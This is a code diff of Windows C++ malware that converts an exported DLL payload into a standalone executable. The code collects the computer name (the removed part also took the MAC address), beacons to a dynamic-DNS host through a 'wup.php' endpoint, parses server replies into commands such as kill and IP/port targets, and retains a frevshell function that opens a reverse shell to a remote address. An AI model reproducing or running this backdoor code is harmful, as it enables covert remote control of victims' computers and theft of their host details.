@@ -1,8 +1,6 @@
-/* Replace "dll.h" with the name of your header */
+
 #define STRSAFE_NO_DEPRECATE
-
-#include "dll.h"
-
+/* run this program using the console pauser or add your own getch, system("pause") or input loop */
 #include <iostream>
 #include <algorithm>    // copy
 #include <iterator>     // back_inserter
@@ -20,34 +18,9 @@
 #include <Assert.h>
 #pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib,"ws2_32.lib")
+
 char smac[255];
-char * GetMACaddress(void)
-{
-	
-	IP_ADAPTER_INFO AdapterInfo[16];			// Allocate information for up to 16 NICs
-	DWORD dwBufLen = sizeof(AdapterInfo);		// Save the memory size of buffer
 
-	DWORD dwStatus = GetAdaptersInfo(			// Call GetAdapterInfo
-		AdapterInfo,							// [out] buffer to receive data
-		&dwBufLen);								// [in] size of receive data buffer
-	assert(dwStatus == ERROR_SUCCESS);			// Verify return value is valid, no buffer overflow
-
-	PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;// Contains pointer to current adapter info
-	do {
-		if (strcmp(pAdapterInfo->GatewayList.IpAddress.String, "0.0.0.0"))
-		{
-			//return PrintMACaddress(pAdapterInfo->Address);	// Print MAC address
-			sprintf(smac, "%02X:%02X:%02X:%02X:%02X:%02X",
-				pAdapterInfo->Address[0], pAdapterInfo->Address[1], pAdapterInfo->Address[2], pAdapterInfo->Address[3], pAdapterInfo->Address[4], pAdapterInfo->Address[5]);
-			//MessageBoxA(0, smac, "Hi", MB_ICONINFORMATION);
-			return smac;
-		}
-
-
-		//printf("\tGateway: \t%s\n", pAdapterInfo->GatewayList.IpAddress.String);
-		pAdapterInfo = pAdapterInfo->Next;		// Progress through linked list
-	} while (pAdapterInfo);						// Terminate if last adapter
-}
 static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)
 {
 	((std::string*)userp)->append((char*)contents, size * nmemb);
@@ -60,26 +33,26 @@ std::wstring getComputerName() {
 	GetComputerNameW(buffer, &cchBufferSize);
 	return std::wstring(&buffer[0]);
 }
-
-extern "C" DLLIMPORT void sysfunc()
-{
-	//MessageBox(0,"Hello World from DLL!\n","Hi",MB_ICONINFORMATION);
+int main(int argc, char** argv) {
 	
+  
+	
+
+
+	//MessageBox(0,"Hello World from DLL!\n","Hi",MB_ICONINFORMATION);
     CURL *curl_handle;
 	CURLcode res;
 	std::vector<std::wstring> sites(2);
 	//std::wstring sites[1];
 	std::string readBuffer;
 	std::wstring wsurl;
-	std::string surl, stest, surlkill,scomputer;
+	std::string surl, stest, surlkill;
 	std::string segment, sip, skill, sport;
 	std::vector<std::string> seglist;
-    
-    
-	WSADATA wsaData;
+    WSADATA wsaData;
   int iResult;
   iResult = WSAStartup(MAKEWORD(2, 2), &wsaData); 
-	sites[0] = L"http://paner.altervista.org/";
+	sites[0] = L"http://www.google.com/";
 	IN_ADDR addr;
 	hostent* list_ip = gethostbyname("config01.homepc.it");
 	memcpy(&addr.S_un.S_addr , list_ip->h_addr, list_ip->h_length);
@@ -101,24 +74,19 @@ extern "C" DLLIMPORT void sysfunc()
 		wsurl.append(L"svc/wup.php?pc=");
 		wsurl.append(getComputerName());
 		surl.assign(wsurl.begin(), wsurl.end());
-		
 		//stest.append(GetMACaddress());
 		//MessageBoxA(0, GetMACaddress(), "Hi", MB_ICONINFORMATION);
-		surl.append("_"); surl.append(GetMACaddress()); surl.append("_v1");
+		
 		curl_easy_setopt(curl_handle, CURLOPT_URL, surl.c_str());
 		curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, WriteCallback);
 		curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, &readBuffer);
 		curl_easy_setopt(curl_handle, CURLOPT_USERAGENT, "Mozilla/5.0");
 		res = curl_easy_perform(curl_handle);
-		MessageBox(0,surl.c_str(),"Hi",MB_ICONINFORMATION);
 		std::cout << readBuffer << std::endl;
 		char *token = strtok((char *)readBuffer.c_str(), "||");
-		
 		std::vector<int> v;
+        MessageBox(0, surl.c_str(), "Hi", MB_ICONINFORMATION);
         int j=0;
-        
-        
-		    MessageBox(0,token,"Hi",MB_ICONINFORMATION);
 		while (token != NULL) {
 			v.push_back(std::strtol(token, NULL, 10));
 			seglist.push_back(token);
@@ -140,7 +108,6 @@ extern "C" DLLIMPORT void sysfunc()
 				res = curl_easy_perform(curl_handle);
 			}
 		}
-		
 		//for (std::size_t i = 0; i < v.size(); ++i)
 		//	std::cout << v[i] << std::endl;
 
@@ -148,34 +115,10 @@ extern "C" DLLIMPORT void sysfunc()
 	curl_easy_cleanup(curl_handle);
 	curl_global_cleanup();
 	 
-
+    return 0;
 }
 
-BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved)
-{
-	switch(fdwReason)
-	{
-		case DLL_PROCESS_ATTACH:
-		{
-			break;
-		}
-		case DLL_PROCESS_DETACH:
-		{
-			break;
-		}
-		case DLL_THREAD_ATTACH:
-		{
-			break;
-		}
-		case DLL_THREAD_DETACH:
-		{
-			break;
-		}
-	}
-	
-	/* Return TRUE on success, FALSE on failure */
-	return TRUE;
-}
+
 void frevshell(PCSTR REMOTE_ADDR, PCSTR REMOTE_PORT)
 {
 	FreeConsole();
@@ -208,4 +151,3 @@ void frevshell(PCSTR REMOTE_ADDR, PCSTR REMOTE_PORT)
 	CloseHandle(pi.hThread);
 	WSACleanup();
 }
-
